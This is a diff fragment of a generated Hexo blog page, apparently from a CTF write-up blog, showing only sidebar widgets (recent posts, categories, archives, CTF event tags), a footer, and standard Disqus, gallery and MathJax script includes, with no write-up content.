+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-Wordpresso/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-Wordpresso/0.png)" alt="2020 CCE - Wordpresso" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-Wordpresso/" class="title">2020 CCE - Wordpresso</a></p>
+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/27/2020-CCE-nomorephp/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/27/2020-CCE-nomorephp/0.png)" alt="2020 CCE - nomorephp" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/27/2020-CCE-nomorephp/" class="title">2020 CCE - nomorephp</a></p>
+                            <p class="item-date"><time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/13/2020-Cyberoc-Vaccine-Paper/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2020/09/13/2020-Cyberoc-Vaccine-Paper/10.png)" alt="2020 Cyberoc - Vaccine Paper (Web)" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/Hacking/Web/">Web</a></p>
+                            <p class="item-title"><a href="/2020/09/13/2020-Cyberoc-Vaccine-Paper/" class="title">2020 Cyberoc - Vaccine Paper (Web)</a></p>
+                            <p class="item-date"><time datetime="2020-09-12T15:00:00.000Z" itemprop="datePublished">2020-09-13</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">categories</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Development/">Development</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Development/Algorithm/">Algorithm</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Development/iOS/">iOS</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/">Hacking</a><span class="category-list-count">60</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Crpto/">Crpto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Crypto/">Crypto</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Forensic/">Forensic</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Misc/">Misc</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Network/">Network</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Pwnable/">Pwnable</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Reversing/">Reversing</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hacking/Web/">Web</a><span class="category-list-count">15</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Question/">Question</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Story/">Story</a><span class="category-list-count">3</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">arxius</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">etiquetes</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0ctf-2017/">0ctf 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020-CCE/">2020 CCE</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020-Cyberoc/">2020 Cyberoc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/">Algorithm</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Code-Blue-CTF-2018-Quals/">Code Blue CTF 2018 Quals</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2018-Final/">Codegate CTF 2018 Final</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2018-Preliminary/">Codegate CTF 2018 Preliminary</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codegate-CTF-2020-Preliminary/">Codegate CTF 2020 Preliminary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEF-CON-CTF-Qualifier-2017/">DEF CON CTF Qualifier 2017</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEFCON-2018/">DEFCON 2018</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FBCTF-2019/">FBCTF 2019</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HDCON-2017/">HDCON 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HITCON-CTF-2017/">HITCON CTF 2017</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Harekaze-CTF/">Harekaze CTF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Maplestory/">Maplestory</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Math/">Math</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PCTF-2018/">PCTF 2018</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Project/">Project</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SHA-1/">SHA-1</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SHA2017-CTF/">SHA2017 CTF</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-PreQuals-2017/">Samsung CTF PreQuals 2017</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-PreQuals-2018/">Samsung CTF PreQuals 2018</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Samsung-CTF-Quals-2018/">Samsung CTF Quals 2018</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TAMU-CTF/">TAMU CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Whitehat-Contest-2018-PreQual/">Whitehat Contest 2018 PreQual</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Whitehat-contest-2017-PreQual/">Whitehat contest 2017 PreQual</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WiFi/">WiFi</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/defcon/">defcon</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iOS/">iOS</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zer0pts-ctf-2020/">zer0pts ctf 2020</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/크리스마스-CTF/">크리스마스 CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/화이트해커리그/">화이트해커리그</a><span class="tag-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-float">
+        <h3 class="widget-title">etiqueta cloud</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/0ctf-2017/" style="font-size: 10px;">0ctf 2017</a> <a href="/tags/2020-CCE/" style="font-size: 13.33px;">2020 CCE</a> <a href="/tags/2020-Cyberoc/" style="font-size: 10px;">2020 Cyberoc</a> <a href="/tags/Algorithm/" style="font-size: 18.33px;">Algorithm</a> <a href="/tags/C/" style="font-size: 10px;">C</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/Code-Blue-CTF-2018-Quals/" style="font-size: 11.67px;">Code Blue CTF 2018 Quals</a> <a href="/tags/Codegate-CTF-2018-Final/" style="font-size: 11.67px;">Codegate CTF 2018 Final</a> <a href="/tags/Codegate-CTF-2018-Preliminary/" style="font-size: 20px;">Codegate CTF 2018 Preliminary</a> <a href="/tags/Codegate-CTF-2020-Preliminary/" style="font-size: 10px;">Codegate CTF 2020 Preliminary</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/DEF-CON-CTF-Qualifier-2017/" style="font-size: 11.67px;">DEF CON CTF Qualifier 2017</a> <a href="/tags/DEFCON-2018/" style="font-size: 10px;">DEFCON 2018</a> <a href="/tags/FBCTF-2019/" style="font-size: 10px;">FBCTF 2019</a> <a href="/tags/HDCON-2017/" style="font-size: 10px;">HDCON 2017</a> <a href="/tags/HITCON-CTF-2017/" style="font-size: 10px;">HITCON CTF 2017</a> <a href="/tags/Harekaze-CTF/" style="font-size: 11.67px;">Harekaze CTF</a> <a href="/tags/Maplestory/" style="font-size: 10px;">Maplestory</a> <a href="/tags/Math/" style="font-size: 13.33px;">Math</a> <a href="/tags/PCTF-2018/" style="font-size: 13.33px;">PCTF 2018</a> <a href="/tags/Project/" style="font-size: 10px;">Project</a> <a href="/tags/SHA-1/" style="font-size: 10px;">SHA-1</a> <a href="/tags/SHA2017-CTF/" style="font-size: 15px;">SHA2017 CTF</a> <a href="/tags/Samsung-CTF-PreQuals-2017/" style="font-size: 16.67px;">Samsung CTF PreQuals 2017</a> <a href="/tags/Samsung-CTF-PreQuals-2018/" style="font-size: 11.67px;">Samsung CTF PreQuals 2018</a> <a href="/tags/Samsung-CTF-Quals-2018/" style="font-size: 13.33px;">Samsung CTF Quals 2018</a> <a href="/tags/TAMU-CTF/" style="font-size: 10px;">TAMU CTF</a> <a href="/tags/Whitehat-Contest-2018-PreQual/" style="font-size: 11.67px;">Whitehat Contest 2018 PreQual</a> <a href="/tags/Whitehat-contest-2017-PreQual/" style="font-size: 10px;">Whitehat contest 2017 PreQual</a> <a href="/tags/WiFi/" style="font-size: 10px;">WiFi</a> <a href="/tags/defcon/" style="font-size: 10px;">defcon</a> <a href="/tags/iOS/" style="font-size: 16.67px;">iOS</a> <a href="/tags/pwnable-kr/" style="font-size: 10px;">pwnable.kr</a> <a href="/tags/zer0pts-ctf-2020/" style="font-size: 10px;">zer0pts ctf 2020</a> <a href="/tags/크리스마스-CTF/" style="font-size: 10px;">크리스마스 CTF</a> <a href="/tags/화이트해커리그/" style="font-size: 10px;">화이트해커리그</a>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">links</h3>
+        <div class="widget">
+            <ul>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <!--
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+            -->
+                <p>&copy; 2021 Youngho Kim</p>
+                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_shortname = 'm1ku';
+    
+    
+    var disqus_url = 'https://kimtruth.github.io/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
